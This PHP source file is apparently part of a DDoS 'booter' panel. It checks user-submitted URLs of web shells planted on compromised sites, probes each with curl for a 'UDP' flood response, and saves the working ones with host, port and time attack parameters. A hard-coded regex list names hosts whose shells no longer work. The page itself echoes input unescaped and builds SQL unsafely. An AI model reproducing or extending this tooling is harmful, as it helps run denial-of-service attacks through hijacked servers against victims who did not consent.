<?php
    include 'inc/db.php';
    include 'inc/header.php';
    if (!($user -> LoggedIn()))
    {
        header('location: login.php');
        die();
    }
?>
<html>
    <body>
        <p style="text-align: center;">
            Shell checker<br>
            This is a simple shell checker that checks each shell for<br>
            A. If it's up<br>
            B. If it's a public, non-working shell<br>
            C. If it ends in .php<br>
            The non-working shell list grows almost everyday, btw<br>
            <b><p class="error">Do NOT just upload a bunch of shells to the same website. It doesn't work like that.<br>
            Also, free hosting NEVER works, so don't use that</b></p>
        </p>
        <div class="box" align="center">
            <h2>Check Shells</h2>
            <div class="box-content">
                <center>
                    <form name="frmcontadd" action="" method="post">
                        <textarea class="entryfield" name="url" cols=75 rows=6></textarea><br><br>
                        <input class="large blue button" type="submit" name="Submit" value="Add Shells">
                    </form>
                </center>
            </div>
        </div>
    </body>
</html>

<?php
set_time_limit(0);
if (isset($_POST['Submit'])) {
    $values = array();
    $hosts1 = explode("\r\n", $_POST['url']);
    $hosts = array_unique($hosts1);
    $hosts = preg_replace("/[.]php(.*)/", ".php", $hosts);
    $hosts = array_unique($hosts);
    $hosts = array_filter($hosts);
    sort($hosts);
    $count = count($hosts);
    if($count >= 500){
        die('Please enter only 500 or less shells');
    }
    foreach ($hosts as $data) {
        $data = trim($data);
        $data = preg_replace("/www./", "", $data);
        $data = preg_replace("/\?(.*)/", "", $data);
        if (preg_match("/webs|erbil.at|201.144.204.153|aioearning|multimania.nl|tongyushoes.cn|fireboobs.com|tugramobilyaof.com|99.188.232.191|118.97.238.46|175.28.13.160|210.212.255.228|110mb|t35|50.30.45.14|funpic.de|webatu.com|124.115.228.235|rondvorak.com|173.201.177.81|88.149.176.92|202.77.125.132|58.26.209.99|abyssoft|fabiensanglard|icyhosts|algorytmy|php.net|caligare|81.186.168.13|timecloud|cwsurf.de|211.75.138.47|orbecargo|jorginahall|davidbarnes|mustangrobotics|148.235.74.163|72.44.46.217|brandondrury|kristeel|blackapplehost.com|jrnickz.com|filbanken.nu|sultryserver.com|solidwebhost.com|87.84.218.116|72.252.1.20|202.137.230.137|200.140.145.29|193.186.35.32|163.178.170.74|claber.ir|danevdzwaag.nl|212.87.232.160|buchsermusic.org|wireshark.org|rosinstrument.com|webadminblog.com|cacuonhuythanh.com|cuacuonhuythanh.com|67.134.12.12|76.25.55.155|201.120.128.144|199.119.204.181|elcolonodigital|milongadelrocanrol|isc.gob.mx|153.96.23.18|showthread|124.106.114.243|visualfoodplanner.com|owyheeair.com|222.154.227.250|62.119.49.36| |vipartners.mu|210.212.58.232|202.114.18.20|sorel.dk|quadraturderreise.de|124.17.124.8|200.37.255.246|217.6.136.144|87.139.183.231|altervista.org|freehotlayouts.us|kambarys.info|kingstrikepin.se|nafsiahasa.com|free.fr|mapi.co.kr|atwservice.com|dslreports.com|sockslist.net|jennpaul.net|161.139.194.77|87.139.183.231|github.com|losangelesplumbing.biz|67.221.116.25|wordpress.com|124.106.114.243|charminarconnection.org|munialtoalianza.gob.pe|bugs3|tkdaz.com|munibarranco|windowsecurity|feedburner|blogspot|1100f|hostujem|ngoisaoblog|blog-indonesia|wapforfree|elyne-garance|tehbawz|anatoile|203.157.202.2|byethost2|red-pill|team-crowplay|webobo|tux-planet|gigfa/", $data)) {
            echo '<p class="error">' . $data . ' is on the list of non-working shells!</p><br>';
        } else {
            if (!preg_match("/php/", $data)) {
                echo '<p class="error">' . $data . " does not end with .php (It's more than likely not working then)</p><br>";
            } else {
                if (filter_var($data, FILTER_VALIDATE_URL) === FALSE) {
                    echo '<p class="error">' . $data . ' is not a valid URL</p><br>';
                } else {
                    $ch = curl_init($data);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                    curl_setopt($ch, CURLOPT_HEADER, TRUE);
                    curl_setopt($ch, CURLOPT_NOBODY, FALSE);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    $response = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    if ($httpCode == 404 | $httpCode == 403 | $httpCode == 500) {
                        echo '<p class="error">' . $data . " returned a HTTP 403, 404, or 500 error</p><br>";
                        curl_close($ch);
                    } else {
                        $test = strpos($response, "UDP");
                        if ($test == false) {
                            echo '<p class="error">' . $data . ' is not a valid Shell!</p><br>';
                        } else {
                            echo '<p class="success">' . $data . " is a working shell :D!</p><br>";
                            if(!empty($data)){
                                $values[] .= "('" . mysqli_real_escape_string($data) . "?host=[host]&port=[port]&time=[time]')";
                            }
                        }
                    }
                }
            }
        }
    }
    foreach ($values as $pen) {
        if(!empty($pen)){
            $query = "SELECT COUNT(*) AS total FROM shells WHERE `URL` = $pen";
            $shell = $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
            $shells = mysqli_fetch_assoc($shell);
            if ($shells['total'] >= 1) {
                echo '<p class="error">' . $pen . ' is already in the database!</p><br>';
            } else {
                $value[] .= $pen;
            }
        }
    }
    if(!empty($value)){
        $id = $_SESSION['ID'];
        $count = count($value);
        $query = "INSERT INTO shells (`url`) VALUES " . implode(',', $value);
        $mysqli->query($query) or die($query . '<br />' . $mysqli->error);
        foreach ($value as $userid) {
            $query2 = "UPDATE `shells` SET `UserID` = '$id' WHERE `url` = " . $userid;
            $mysqli->query($query2) or die($query2 . '<br />' . $mysqli->error);
        }
        echo '<hr>Successfully added Shells to the shells database.';
    } else {
        echo '<p class="error"> No shells were added to the database!</p>';
    }
}
?>
